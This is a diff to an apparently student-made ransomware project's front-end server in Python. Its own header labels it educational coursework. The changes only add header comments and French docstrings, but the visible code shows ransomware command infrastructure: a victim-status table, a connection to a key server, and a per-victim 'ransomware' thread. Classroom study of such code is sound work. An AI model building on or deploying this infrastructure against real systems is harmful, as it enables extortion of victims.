@@ -1,3 +1,12 @@
+# --------------------------------------------
+# Ransomware Project for educational purposes
+# Course : Security integration
+# Bloc : 1
+# Group : IS4
+# Class : serveur_frontal
+# --------------------------------------------
+# Importations
+# --------------------------------------------
 import json
 import threading
 import time
@@ -9,22 +18,28 @@ from threading import Thread
 import utile.config as configg
 import utile.message as message
 from utile.network import recv_msg, send_msg
-
-
+# --------------------------------------------
+# Variables global
+# --------------------------------------------
 status_victims = {}
 lock = threading.Lock()
-
-
+# --------------------------------------------
+# Classes
+# --------------------------------------------
 class serveur_frontal(object):
 
     def __init__(self, ip, port, retry=60):
-        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
+        """
+        Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
         """
         self.ip = ip
         self.port = port
         self.retry = retry
 
     def start_server(self):
+        """
+        Démarre le serveur
+        """
         global config_serveur
         global config_workstation
         configg.load_config("serveur_frontale/configs/config.json", "serveur_frontale/configs/config.key")
@@ -57,6 +72,9 @@ class serveur_frontal(object):
             t_v.start()
 
     def thread_srv_cles(self, q_messages_receiv):
+        """
+        Thread de serveur de clé
+        """
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((self.ip_cles, self.port_cles))
 
@@ -80,6 +98,9 @@ class serveur_frontal(object):
                     queue_response.put(rsp)
 
     def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
+        """
+        Thread de ransomware
+        """
         global config_serveur
         global config_workstation
         global status_victims
